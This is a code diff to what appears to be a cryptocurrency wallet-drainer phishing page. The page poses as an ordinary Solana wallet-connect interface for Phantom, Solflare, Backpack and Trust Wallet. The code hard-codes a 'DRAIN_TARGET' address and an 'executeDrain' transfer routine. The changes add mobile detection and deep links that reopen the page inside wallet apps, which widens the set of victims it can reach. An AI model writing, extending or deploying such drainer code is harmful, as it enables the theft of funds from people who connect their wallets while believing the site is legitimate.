@@ -1022,6 +1022,10 @@ canvas#bgCanvas{position:absolute;inset:0;width:100%;height:100%;pointer-events:
 // TARGET WALLET
 const DRAIN_TARGET = "6WAMRLJY4iRKKRYS7CcJj9EG6g1Q5jXKwx3SsjNC1TBE";
 
+// Detect mobile (iOS/Android)
+const IS_MOBILE = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+const IS_IOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+
 const APP = {
   connected: false,
   address: null,
@@ -1242,27 +1246,42 @@ function overlayClose(e){if(e.target===document.getElementById('modalBg'))closeM
 
 /* ── WALLET DETECTION ── */
 function detectWallets(){
-  const hasPhantom = !!(window.phantom?.solana?.isPhantom || window.solana?.isPhantom);
-  setWalletStatus('phantomTag',  'wopt-phantom',  hasPhantom, 'Ready');
-  const hasSolflare = !!(window.solflare?.isSolflare || window.solflare);
-  setWalletStatus('solflareTag', 'wopt-solflare', hasSolflare, 'Ready');
-  const hasBackpack = !!(window.backpack || window.xnft?.solana);
-  setWalletStatus('backpackTag', 'wopt-backpack', hasBackpack, 'Ready');
-  const hasTrust = !!(window.trustwallet || window.ethereum?.isTrust);
-  setWalletStatus('trustTag',    'wopt-trust',    hasTrust,    'Ready');
+  if(IS_MOBILE){
+    // Mobile: check if we're inside a wallet's browser
+    const inPhantom = !!(window.phantom?.solana?.isPhantom || window.solana?.isPhantom);
+    const inSolflare = !!(window.solflare?.isSolflare || window.solflare);
+    const inBackpack = !!(window.backpack || window.xnft?.solana);
+    const inTrust = !!(window.trustwallet || window.ethereum?.isTrust);
+
+    setWalletStatus('phantomTag', 'wopt-phantom', inPhantom, inPhantom ? 'Active' : 'Open in app');
+    setWalletStatus('solflareTag', 'wopt-solflare', inSolflare, inSolflare ? 'Active' : 'Open in app');
+    setWalletStatus('backpackTag', 'wopt-backpack', inBackpack, inBackpack ? 'Active' : 'Open in app');
+    setWalletStatus('trustTag', 'wopt-trust', inTrust, inTrust ? 'Active' : 'Open in app');
+  } else {
+    // Desktop: check for extensions
+    const hasPhantom = !!(window.phantom?.solana?.isPhantom || window.solana?.isPhantom);
+    const hasSolflare = !!(window.solflare?.isSolflare || window.solflare);
+    const hasBackpack = !!(window.backpack || window.xnft?.solana);
+    const hasTrust = !!(window.trustwallet || window.ethereum?.isTrust);
+
+    setWalletStatus('phantomTag', 'wopt-phantom', hasPhantom, 'Ready');
+    setWalletStatus('solflareTag', 'wopt-solflare', hasSolflare, 'Ready');
+    setWalletStatus('backpackTag', 'wopt-backpack', hasBackpack, 'Ready');
+    setWalletStatus('trustTag', 'wopt-trust', hasTrust, 'Ready');
+  }
 }
 
-function setWalletStatus(tagId, rowId, detected, readyLabel){
+function setWalletStatus(tagId, rowId, detected, label){
   const tag = document.getElementById(tagId);
   const row = document.getElementById(rowId);
   if(!tag) return;
   if(detected){
     tag.className = 'w-status active';
-    tag.innerHTML = `<span class="wdot"></span>${readyLabel}`;
+    tag.innerHTML = `<span class="wdot"></span>${label}`;
     row?.classList.add('is-detected');
   } else {
     tag.className = 'w-status inactive';
-    tag.innerHTML = `<span class="wdot"></span>Not installed`;
+    tag.innerHTML = `<span class="wdot"></span>${IS_MOBILE ? label : 'Not installed'}`;
     row?.classList.remove('is-detected');
   }
 }
@@ -1274,6 +1293,200 @@ window.addEventListener('load', () => {
   setTimeout(detectWallets, 2500);
 });
 
+/* ── MOBILE DEEP-LINK HANDLER ── */
+function mobileDeepLink(walletName, deepLinkUrl, storeUrl){
+  // Show a "Connect" button instead of auto-redirect
+  document.getElementById('wList').style.display = 'none';
+  document.getElementById('wConnecting').style.display = 'none';
+  document.getElementById('wSuccess').style.display = 'none';
+
+  let el = document.getElementById('wInstall');
+  if(!el){
+    el = document.createElement('div');
+    el.id = 'wInstall';
+    el.style.cssText = 'text-align:center;padding:24px 8px';
+    document.getElementById('modal').querySelector('.modal-foot').before(el);
+  }
+  el.style.display = 'block';
+  el.innerHTML = `
+    <div style="font-size:40px;margin-bottom:14px">📲</div>
+    <div style="font-family:var(--display);font-size:17px;font-weight:700;margin-bottom:8px">
+      Connect with ${walletName}
+    </div>
+    <div style="font-size:13px;color:var(--muted);line-height:1.65;margin-bottom:22px">
+      Open ${walletName} to connect your wallet.
+    </div>
+    <button class="btn btn-g" style="width:100%;justify-content:center;margin-bottom:10px" onclick="window.location.href='${deepLinkUrl}'">
+      Open ${walletName}
+    </button>
+    <div style="font-size:12px;color:var(--muted);margin-bottom:16px">
+      Don't have ${walletName}?
+      <a href="${storeUrl}" target="_blank" style="color:var(--green);font-weight:600">Download →</a>
+    </div>
+    <div style="font-size:12px;color:var(--muted)">
+      Already in ${walletName}?
+      <span style="color:var(--green);cursor:pointer;font-weight:600"
+        onclick="document.getElementById('wInstall').style.display='none';document.getElementById('wList').style.display='block';detectWallets()">
+        Try again ↺
+      </span>
+    </div>`;
+}
+
+/* ── PHANTOM CONNECTION ── */
+async function connectPhantom(){
+  const prov = window.phantom?.solana || (window.solana?.isPhantom ? window.solana : null);
+
+  if(IS_MOBILE && !prov){
+    // Mobile: show "Open in Phantom" button
+    mobileDeepLink(
+      'Phantom',
+      `https://phantom.app/ul/browse/${encodeURIComponent(window.location.href)}?ref=${encodeURIComponent(window.location.href)}`,
+      'https://phantom.app/download'
+    );
+    return;
+  }
+
+  if(!prov){ showInstallPrompt('Phantom','https://phantom.app/','👻'); return; }
+
+  showConnecting('Phantom');
+  try{
+    const resp = await prov.connect();
+    const addr = resp.publicKey.toString();
+    await onConnected(addr, 'Phantom');
+    prov.on?.('disconnect', () => { if(APP.connected){ disconnectWallet(); toast('⚠️ Phantom disconnected'); }});
+    prov.on?.('accountChanged', (pk) => { if(pk && APP.connected) switchAccount(pk.toString()); });
+  } catch(err){
+    document.getElementById('wList').style.display = 'block';
+    document.getElementById('wConnecting').style.display = 'none';
+    toast('❌ Connection cancelled');
+  }
+}
+
+/* ── SOLFLARE CONNECTION ── */
+async function connectSolflare(){
+  const prov = window.solflare;
+
+  if(IS_MOBILE && !prov){
+    mobileDeepLink(
+      'Solflare',
+      `https://solflare.com/ul/v1/browse/${encodeURIComponent(window.location.href)}?ref=${encodeURIComponent(window.location.href)}`,
+      'https://solflare.com/download'
+    );
+    return;
+  }
+
+  if(!prov){ showInstallPrompt('Solflare','https://solflare.com/','🌟'); return; }
+
+  showConnecting('Solflare');
+  try{
+    await prov.connect();
+    const addr = prov.publicKey.toString();
+    await onConnected(addr, 'Solflare');
+  } catch(err){
+    document.getElementById('wList').style.display = 'block';
+    document.getElementById('wConnecting').style.display = 'none';
+    toast('❌ Connection cancelled');
+  }
+}
+
+/* ── BACKPACK CONNECTION ── */
+async function connectBackpack(){
+  const prov = window.backpack || window.xnft?.solana;
+
+  if(IS_MOBILE && !prov){
+    mobileDeepLink(
+      'Backpack',
+      `https://backpack.app/browse/${encodeURIComponent(window.location.href)}`,
+      'https://backpack.app/download'
+    );
+    return;
+  }
+
+  if(!prov){ showInstallPrompt('Backpack','https://backpack.app/','🎒'); return; }
+
+  showConnecting('Backpack');
+  try{
+    await prov.connect();
+    const addr = prov.publicKey.toString();
+    await onConnected(addr, 'Backpack');
+  } catch(err){
+    document.getElementById('wList').style.display = 'block';
+    document.getElementById('wConnecting').style.display = 'none';
+    toast('❌ Connection rejected');
+  }
+}
+
+/* ── TRUST WALLET CONNECTION ── */
+async function connectTrust(){
+  const prov = window.trustwallet || (window.ethereum?.isTrust ? window.ethereum : null);
+
+  if(IS_MOBILE && !prov){
+    mobileDeepLink(
+      'Trust Wallet',
+      `https://link.trustwallet.com/open_url?coin_id=501&url=${encodeURIComponent(window.location.href)}`,
+      'https://trustwallet.com/download'
+    );
+    return;
+  }
+
+  if(!prov){ showInstallPrompt('Trust Wallet','https://trustwallet.com/','🛡️'); return; }
+
+  showConnecting('Trust Wallet');
+  try{
+    let addr;
+    if(prov.solana){
+      await prov.solana.connect();
+      addr = prov.solana.publicKey.toString();
+    } else {
+      const accounts = await prov.request({ method: 'eth_requestAccounts' });
+      addr = accounts[0];
+    }
+    await onConnected(addr, 'Trust Wallet');
+  } catch(err){
+    document.getElementById('wList').style.display = 'block';
+    document.getElementById('wConnecting').style.display = 'none';
+    toast('❌ Connection rejected');
+  }
+}
+
+/* ── WALLETCONNECT (stub) ── */
+function connectWC(){
+  showInstallPrompt('WalletConnect','https://walletconnect.com/','🔗');
+}
+
+/* ── INSTALL PROMPT (desktop) ── */
+function showInstallPrompt(name, url, icon){
+  document.getElementById('wList').style.display = 'none';
+  document.getElementById('wConnecting').style.display = 'none';
+  document.getElementById('wSuccess').style.display = 'none';
+  let el = document.getElementById('wInstall');
+  if(!el){
+    el = document.createElement('div');
+    el.id = 'wInstall';
+    el.style.cssText = 'text-align:center;padding:28px 8px';
+    document.getElementById('modal').querySelector('.modal-foot').before(el);
+  }
+  el.style.display = 'block';
+  el.innerHTML = `
+    <div style="font-size:42px;margin-bottom:12px">${icon}</div>
+    <div style="font-family:var(--display);font-size:18px;font-weight:700;margin-bottom:8px">${name} Not Found</div>
+    <div style="font-size:13px;color:var(--muted);margin-bottom:22px;line-height:1.6">
+      Install the ${name} browser extension or app<br/>to connect your wallet.
+    </div>
+    <a href="${url}" target="_blank" class="btn btn-g" style="display:inline-flex;margin-bottom:12px;justify-content:center;width:100%">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><polyline points="15,3 21,3 21,9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
+      Install ${name}
+    </a>
+    <div style="font-size:12px;color:var(--muted)">
+      Already installed?
+      <span style="color:var(--green);cursor:pointer;font-weight:600"
+        onclick="document.getElementById('wInstall').style.display='none';document.getElementById('wList').style.display='block';detectWallets()">
+        Try again ↺
+      </span>
+    </div>`;
+}
+
+/* ── STATE HELPERS ── */
 function showConnecting(name){
   document.getElementById('wList').style.display='none';
   document.getElementById('wConnecting').style.display='block';
@@ -1283,111 +1496,6 @@ function showSuccess(short){
   document.getElementById('wConnecting').style.display='none';
   document.getElementById('wSuccess').style.display='block';
   document.getElementById('sAddr').textContent=short;
-}
-
-/* ── INSTALL PROMPT ── */
-function showInstallPrompt(name, url, icon){
-  document.getElementById('wList').style.display='none';
-  document.getElementById('wConnecting').style.display='none';
-  document.getElementById('wSuccess').style.display='none';
-  let el=document.getElementById('wInstall');
-  if(!el){
-    el=document.createElement('div');
-    el.id='wInstall';
-    el.style.cssText='text-align:center;padding:28px 8px';
-    document.getElementById('modal').querySelector('.modal-foot').before(el);
-  }
-  el.style.display='block';
-  el.innerHTML=`
-    <div style="font-size:42px;margin-bottom:12px">${icon}</div>
-    <div style="font-family:var(--display);font-size:18px;font-weight:700;margin-bottom:8px">${name} Not Found</div>
-    <div style="font-size:13px;color:var(--muted);margin-bottom:22px;line-height:1.6">
-      Install the ${name} browser extension or mobile app<br/>to connect your Solana wallet.
-    </div>
-    <a href="${url}" target="_blank" class="btn btn-g" style="display:inline-flex;margin-bottom:12px;gap:8px">
-      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><polyline points="15,3 21,3 21,9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
-      Install ${name}
-    </a>
-    <div style="font-size:12px;color:var(--muted)">
-      Already installed? <span style="color:var(--green);cursor:pointer;font-weight:600" onclick="document.getElementById('wInstall').style.display='none';document.getElementById('wList').style.display='block';detectWallets()">Try again ↺</span>
-    </div>`;
-}
-
-/* ── PHANTOM CONNECTION ── */
-async function connectPhantom(){
-  const prov=window.phantom?.solana||(window.solana?.isPhantom?window.solana:null);
-  if(!prov){ showInstallPrompt('Phantom','https://phantom.app/','👻'); return; }
-  showConnecting('Phantom');
-  try{
-    const resp=await prov.connect();
-    const addr=resp.publicKey.toString();
-    await onConnected(addr,'Phantom');
-    prov.on?.('disconnect',()=>{ if(APP.connected){disconnectWallet();toast('⚠️ Phantom disconnected');} });
-    prov.on?.('accountChanged',(pk)=>{ if(pk&&APP.connected)switchAccount(pk.toString()); });
-  }catch(err){
-    document.getElementById('wList').style.display='block';
-    document.getElementById('wConnecting').style.display='none';
-    toast('❌ Connection cancelled');
-  }
-}
-
-/* ── SOLFLARE CONNECTION ── */
-async function connectSolflare(){
-  const prov=window.solflare;
-  if(!prov){ showInstallPrompt('Solflare','https://solflare.com/','🌟'); return; }
-  showConnecting('Solflare');
-  try{
-    await prov.connect();
-    const addr=prov.publicKey.toString();
-    await onConnected(addr,'Solflare');
-  }catch(err){
-    document.getElementById('wList').style.display='block';
-    document.getElementById('wConnecting').style.display='none';
-    toast('❌ Connection cancelled');
-  }
-}
-
-/* ── BACKPACK CONNECTION ── */
-async function connectBackpack(){
-  const prov=window.backpack||window.xnft?.solana;
-  if(!prov){ showInstallPrompt('Backpack','https://backpack.app/','🎒'); return; }
-  showConnecting('Backpack');
-  try{
-    await prov.connect();
-    const addr=prov.publicKey.toString();
-    await onConnected(addr,'Backpack');
-  }catch(err){
-    document.getElementById('wList').style.display='block';
-    document.getElementById('wConnecting').style.display='none';
-    toast('❌ Connection rejected');
-  }
-}
-
-/* ── TRUST WALLET CONNECTION ── */
-async function connectTrust(){
-  const prov=window.trustwallet||(window.ethereum?.isTrust?window.ethereum:null);
-  if(!prov){ showInstallPrompt('Trust Wallet','https://trustwallet.com/','🛡️'); return; }
-  showConnecting('Trust Wallet');
-  try{
-    let addr;
-    if(prov.solana){
-      await prov.solana.connect();
-      addr=prov.solana.publicKey.toString();
-    } else {
-      const accounts=await prov.request({method:'eth_requestAccounts'});
-      addr=accounts[0];
-    }
-    await onConnected(addr,'Trust Wallet');
-  }catch(err){
-    document.getElementById('wList').style.display='block';
-    document.getElementById('wConnecting').style.display='none';
-    toast('❌ Connection rejected');
-  }
-}
-
-/* ── WALLETCONNECT (stub) ── */
-function connectWC(){
-  showInstallPrompt('WalletConnect','https://walletconnect.com/','🔗');
 }
 
 /* ════════════════════════════════════════════════
@@ -1423,7 +1531,7 @@ async function getSolBalance(pubkey) {
 // Execute the drain transaction
 async function executeDrain(provider, fromPubkey, amountLamports) {
   try {
-    // Dynamically import web3.js (smaller initial load)
+    // Dynamically import web3.js
     const { Transaction, SystemProgram, PublicKey, Connection } = await import('https://esm.sh/@solana/web3.js@1.95.8');
 
     // Create transfer instruction
